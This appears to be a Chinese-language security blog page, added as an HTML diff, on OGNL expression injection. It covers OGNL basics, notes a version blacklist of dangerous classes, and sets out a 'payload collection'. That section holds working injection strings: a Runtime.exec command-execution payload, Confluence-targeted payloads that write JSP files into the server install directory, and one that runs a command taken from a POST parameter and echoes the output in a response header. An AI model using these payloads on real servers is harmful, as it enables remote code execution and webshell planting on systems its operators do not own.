@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ognl 注入 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ognl \u6ce8\u5165", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u4ecb\u7ecd", url: "#_2" },
+              {title: "\u539f\u7406", url: "#_3" },
+              {title: "payload\u6574\u7406", url: "#payload" },
+              {title: "\u5173\u952e\u5b57", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/" class="btn btn-xs btn-link">
+        环境准备与思路
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        Spel表达式注入&相关组件的Spel表达式注入分析
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="ognl">ognl 注入</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#介绍">介绍</a></li>
+<li><a href="#原理">原理</a><ul>
+<li><a href="#DEMO">DEMO</a></li>
+<li><a href="#ognl语法">ognl语法</a></li>
+</ul>
+</li>
+<li><a href="#payload整理">payload整理</a></li>
+<li><a href="#关键字">关键字</a></li>
+</ul>
+<h2 id="_2">介绍</h2>
+<p>表达式的一种</p>
+<h2 id="_3">原理</h2>
+<h3 id="demo">DEMO</h3>
+<p>ognl三要素：expression表达式/root  根对象/context 上下文</p>
+<p>怎样触发一个expression？</p>
+<pre><code class="language-text">ObjectA A = new ObjectA(); //一个任意对象A
+
+OgnlContext context = new OgnlContext(); //创建context
+context.setName(A) //初始化context的根对象，也就是我们要操作的对象
+
+String expression = &quot;A.a&quot; // 表达式就是字符串的样子，这里的意思是调用对象A的a方法
+Object ognl = Ognl.parseExpression(expression) //解析表达式
+
+Object value = Ognl.getValue(ognl,context,context.getRoot()); //调用表达式并获取返回值
+</code></pre>
+<h3 id="ognl_1">ognl语法</h3>
+<pre><code class="language-text">.  获取对象的属性或调用对象的方法。  A.a
+
+@  获取静态类/静态属性或调用静态方法 @java.lang.Runtime@getRuntime().exec()
+
+##  1.调用非root对象 
+// 放入Context中，但不是root
+context.put(&quot;user&quot;, user)
+// 创建Expression，非root，所以要加上#
+String expression = &quot;#user.name&quot;;
+Object ognl = Ognl.parseExpression(expression);
+// 调用
+Object value = Ognl.getValue(ognl,context,context.getRoot());
+   2.创建map   #{&quot;name&quot;: &quot;chenlvtang&quot;, &quot;level&quot;: &quot;noob&quot;}
+   3.定义变量   #a=new java.lang.String[]{&quot;calc&quot;}
+
+%  在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值 %{1+1}
+</code></pre>
+<p>rce的ognl payload：</p>
+<pre><code class="language-text">(#a=new java.lang.String(&quot;calc&quot;)).(@java.lang.Runtime@getRuntime().exec(#a))
+</code></pre>
+<p>写文件</p>
+<pre><code class="language-纯文本">${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',true)).(#bb0.write(new String(@java.util.Base64@getDecoder().decode('MTIz')))).(#bb0.close())}
+
+${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf3.jsp',true)).(#bb0.write('123')).(#bb0.close())}
+
+</code></pre>
+<p>但是这个payload用到了Runtime类，OGNL在&gt;=3.1.25、&gt;=3.2.12的版本中增加了黑名单，ban了很多危险类，包括Runtime。</p>
+<pre><code class="language-text">AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) ||
+ClassResolver.class.isAssignableFrom(methodDeclaringClass) ||
+MethodAccessor.class.isAssignableFrom(methodDeclaringClass) ||
+MemberAccess.class.isAssignableFrom(methodDeclaringClass) ||
+OgnlContext.class.isAssignableFrom(methodDeclaringClass) ||
+Runtime.class.isAssignableFrom(methodDeclaringClass) ||
+ClassLoader.class.isAssignableFrom(methodDeclaringClass) ||
+ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) ||
+AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)
+</code></pre>
+<h2 id="payload">payload整理</h2>
+<p>confluence 的思路</p>
+<pre><code class="language-纯文本">${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',false)).(#bb0.write(@java.util.Base64@getDecoder().decode(''))).(#bb0.close())} 
+base64写文件
+
+${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',false)).(#bb0.write(new java.lang.String(@java.util.Base64@getDecoder().decode('')))).(#bb0.close())} 
+｜base64写文件,包了一层，如果上面指令不能用，试试这个
+
+${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf3.jsp',true)).(#bb0.write('')).(#bb0.close())} 
+明文写文件
+
+${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter(&quot;search&quot;)).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}
+post search参数指定命令
+
+
+${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',true)).(#bb0.write(new String(@java.util.Base64@getDecoder().decode('MTIz')))).(#bb0.close())}
+post search参数指定 写入内容
+</code></pre>
+<h2 id="_4">关键字</h2>
+<p>Ognl.getValue</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/" class="btn btn-xs btn-link">
+        环境准备与思路
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="btn btn-xs btn-link">
+        Spel表达式注入&相关组件的Spel表达式注入分析
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
